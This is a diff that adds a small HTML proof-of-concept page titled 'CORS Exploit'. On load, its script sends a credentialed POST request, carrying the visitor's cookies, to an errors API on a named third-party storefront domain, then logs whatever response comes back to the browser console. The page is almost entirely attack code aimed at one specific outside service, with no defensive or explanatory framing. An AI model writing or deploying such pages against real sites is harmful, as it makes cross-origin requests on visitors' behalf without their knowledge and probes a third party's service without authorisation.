@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CORS Exploit</title>
+    <script>
+        fetch('https://storefront.points.com/api/errors', {
+            method: 'POST',
+            credentials: 'include',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                error: {
+                    message: 'CORS Exploit Test',
+                    stack: 'Testing CORS vulnerability'
+                }
+            })
+        })
+        .then(response => {
+            if (response.ok) {
+                return response.text();
+            } else {
+                console.error('Failed to exploit:', response.statusText);
+            }
+        })
+        .then(data => {
+            console.log('Response Data:', data);
+        })
+        .catch(error => console.error('Error:', error));
+    </script>
+</head>
+<body>
+    <h1>CORS Exploit in Action</h1>
+    <p>If successful, the response from the vulnerable site will be logged to the browser console.</p>
+</body>
+</html>
